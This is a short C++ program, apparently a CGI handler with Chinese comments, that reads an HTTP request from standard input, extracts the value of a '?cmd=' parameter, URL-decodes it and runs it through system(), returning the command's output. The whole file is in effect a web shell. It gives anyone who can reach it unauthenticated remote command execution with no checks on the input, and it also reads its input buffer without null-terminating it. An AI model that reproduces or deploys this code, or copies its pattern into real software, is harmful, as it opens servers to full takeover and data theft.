#include <cstdio>
#include <cstdlib>
#include <iostream>

#include <unistd.h>
#include <sys/ioctl.h>
#include <fstream>
#include <cstring>

using namespace std;

string exec(string);
string UrlDecode(string);
unsigned char fromHex(unsigned char);

int main(void){
    int unread = 0;
    char buf[1000];
    
    // wait for stdin
    while(unread<1){
        if(ioctl(STDIN_FILENO,FIONREAD,&unread)){
            perror("ioctl");
            exit(EXIT_FAILURE);
        }
    }

    // read from stdin fd
    read(STDIN_FILENO,buf,unread);

    // prepare string for response
    string return_string;
    string cmd;
    string receive_string;
    receive_string += buf;

    if(receive_string.find("?cmd=") != -1){
        cmd = receive_string.substr(receive_string.find("?cmd=")+5);
        cmd = UrlDecode(cmd);
        return_string = exec(cmd);
        
    }else{
        return_string = "Please input the command";
    }
    printf("%s",return_string.c_str());
}

string exec(string cmd){
    /* 自定義exec程式，執行cmd回傳結果String */
    string file_name = "tmp";
    system((cmd + " > " + file_name).c_str());
    // 用pipeline的方法把cmd的東西丟到tmp檔案

    ifstream file(file_name);
    return {istreambuf_iterator<char>(file), istreambuf_iterator<char>()};
    // 輸出tmp檔案
}


unsigned char fromHex(unsigned char x) 
{ 
    unsigned char y;
    if (x >= 'A' && x <= 'Z') y = x - 'A' + 10;
    else if (x >= 'a' && x <= 'z') y = x - 'a' + 10;
    else if (x >= '0' && x <= '9') y = x - '0';
    return y;
}

string UrlDecode(string str)
{
    string strTemp = "";
    size_t length = str.length();
    for (size_t i = 0; i < length; i++)
    {
        if (str[i] == '+') strTemp += ' ';
        else if (str[i] == '%')
        {
            unsigned char high = fromHex((unsigned char)str[++i]);
            unsigned char low = fromHex((unsigned char)str[++i]);
            strTemp += high*16 + low;
        }
        else strTemp += str[i];
    }
    return strTemp;

}
